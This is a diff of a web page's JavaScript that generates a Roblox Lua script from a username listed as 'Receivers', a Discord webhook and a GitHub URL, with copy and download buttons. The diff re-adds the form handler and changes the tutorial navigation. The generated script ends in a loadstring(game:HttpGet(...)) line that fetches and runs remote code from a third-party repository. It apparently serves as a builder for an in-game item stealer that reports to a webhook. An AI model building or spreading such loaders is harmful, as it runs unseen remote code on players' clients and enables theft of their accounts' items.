@@ -29,69 +29,65 @@ function fadeOut(element, callback) {
   });
 }
 
-// Generate script form submission
-scriptForm.addEventListener("submit", function (e) {
-  e.preventDefault();
-
-  const username = document.getElementById("username").value.trim();
-  const github = document.getElementById("github").value.trim();
-  const webhook = document.getElementById("webhook").value.trim();
-
-  if (!github.startsWith("https://raw.githubusercontent.com/")) {
-    alert("❌ GitHub raw URL must start with https://raw.githubusercontent.com/");
-    return;
-  }
-
-  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
-    alert("❌ Invalid Discord webhook URL.");
-    return;
-  }
-
-  const luaScript = `
-Config = {
-  Receivers = {"${username}"},
-  Webhook = "${webhook}",
-  ScriptURL = "${github}",
-}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
-`.trim();
-
-  scriptBox.textContent = luaScript;
-  outputSection.classList.remove("hidden");
-  fadeIn(outputSection);
-
-  downloadBtn.onclick = () => {
-    const blob = new Blob([luaScript], { type: "text/plain" });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "generated_script.lua";
-    a.click();
-    URL.revokeObjectURL(url);
-  };
-
-  copyBtn.onclick = () => {
-    navigator.clipboard.writeText(luaScript).then(() => {
-      alert("✅ Script copied to clipboard!");
-    });
-  };
-});
-
-// Tutorial button click — show tutorial with fade animation
+// Show tutorial page with fade animation
 tutorialBtn.addEventListener("click", () => {
-  fadeOut(mainContent, () => {
-    mainContent.classList.add("hidden");
+  fadeOut(scriptForm, () => {
+    scriptForm.classList.add("hidden");
     tutorialPage.classList.remove("hidden");
     fadeIn(tutorialPage);
   });
 });
 
-// Back button click — show main content with fade animation
+// Hide tutorial page and show main form with fade animation
 backBtn.addEventListener("click", () => {
   fadeOut(tutorialPage, () => {
     tutorialPage.classList.add("hidden");
-    mainContent.classList.remove("hidden");
-    fadeIn(mainContent);
+    scriptForm.classList.remove("hidden");
+    fadeIn(scriptForm);
   });
+});
+
+// Handle form submission (just example, adapt as you want)
+scriptForm.addEventListener("submit", (e) => {
+  e.preventDefault();
+  const username = document.getElementById("username").value.trim();
+  const github = document.getElementById("github").value.trim();
+  const webhook = document.getElementById("webhook").value.trim();
+
+  if (!username || !github || !webhook) {
+    alert("Please fill in all fields");
+    return;
+  }
+
+  const script = 
+`Config = {
+  Receivers = {"${username}"},
+  Webhook = "${webhook}",
+  ScriptURL = "${github}",
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()`;
+
+  scriptBox.textContent = script;
+  outputSection.classList.remove("hidden");
+  outputSection.scrollIntoView({ behavior: "smooth" });
+});
+
+// Copy script to clipboard
+copyBtn.addEventListener("click", () => {
+  navigator.clipboard.writeText(scriptBox.textContent).then(() => {
+    copyBtn.textContent = "✅ Copied!";
+    setTimeout(() => (copyBtn.textContent = "📋 Copy"), 1500);
+  });
+});
+
+// Download script as .lua file
+downloadBtn.addEventListener("click", () => {
+  const blob = new Blob([scriptBox.textContent], { type: "text/plain" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "script.lua";
+  a.click();
+  URL.revokeObjectURL(url);
 });
